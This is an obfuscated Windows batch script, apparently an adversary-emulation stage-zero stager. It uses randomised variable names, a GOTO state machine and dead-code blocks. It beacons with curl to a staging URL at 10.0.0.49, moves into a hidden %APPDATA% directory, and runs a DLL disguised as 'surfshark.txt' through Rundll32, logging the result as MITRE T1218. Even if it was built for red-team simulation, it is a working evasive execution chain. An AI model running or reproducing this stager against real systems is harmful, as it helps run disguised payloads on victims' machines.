@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET hgqwlj=%APPDATA%\8899\5281e2f3
SET tncqkj=Macula-Stage0-8899
SET bvfplt=https://10.0.0.49
SET xvzryt=https://10.0.0.49/stage/2/icon.png?8899-7
SET xfdrst=BALAM-S2BO
SET rcvkjh=7
SET jlmnbv=surfshark.txt
SET zxcvfd=8899
SET zxcvgt=%APPDATA%\!rcvkjh!\macula-simulations.log
SET ghtzcp=0

timeout /t 15 /nobreak >nul
GOTO zlkdmn

:plwsqz
SET ghtzcp=17
GOTO zlkdmn

:klpmnv
REM Dead code - never reached
SET fkdm=1
GOTO trewq

:zlkdmn
IF !ghtzcp!==0 GOTO plwsqz
IF !ghtzcp!==17 GOTO bvctre
IF !ghtzcp!==42 GOTO mnbvgh
IF !ghtzcp!==53 GOTO yhnbgt
IF !ghtzcp!==99 GOTO trewq
GOTO qazxsw

:qweras
REM Dead code block
SET junk=0
GOTO trewq

:bvctre
echo [%DATE% %TIME%][DEBUG][!xfdrst!]: heartbeat_start>> "!zxcvgt!" 2>nul
curl -k -s -o nul "!xvzryt!"
echo [%DATE% %TIME%][DEBUG][!xfdrst!]: heartbeat_complete>> "!zxcvgt!" 2>nul
SET ghtzcp=42
ping -n 8 127.0.0.1 >nul
GOTO zlkdmn

:yhnbgt
SET ttp_res=1
SET err_det=
SET rdl=Rundll32.exe
!rdl! !jlmnbv!,DllMain
IF !ERRORLEVEL! NEQ 0 SET ttp_res=0&SET err_det=load_failed_!ERRORLEVEL!
echo [%DATE% %TIME%][!xfdrst!]: !rcvkjh!-!zxcvfd!-T1218|Signed Binary Proxy Execution: Rundll32=!ttp_res!:!err_det!>> "!zxcvgt!" 2>nul
SET ghtzcp=99
CHOICE /C Y /N /D Y /T 12 >nul
GOTO zlkdmn

:qazxsw
SET fake=1
IF !fake!==1 GOTO lkjhgf
GOTO trewq

:lkjhgf
REM Dead code
EXIT

:mnbvgh
echo [%DATE% %TIME%][DEBUG][!xfdrst!]: chdir_start>> "!zxcvgt!" 2>nul
cd /d "!hgqwlj!"
echo [%DATE% %TIME%][DEBUG][!xfdrst!]: chdir_complete>> "!zxcvgt!" 2>nul
SET ghtzcp=53
SET /A dly=%RANDOM% %% 15 + 10
timeout /t !dly! /nobreak >nul
GOTO zlkdmn

:trewq
echo [%DATE% %TIME%][DEBUG][!xfdrst!]: script_exit>> "!zxcvgt!" 2>nul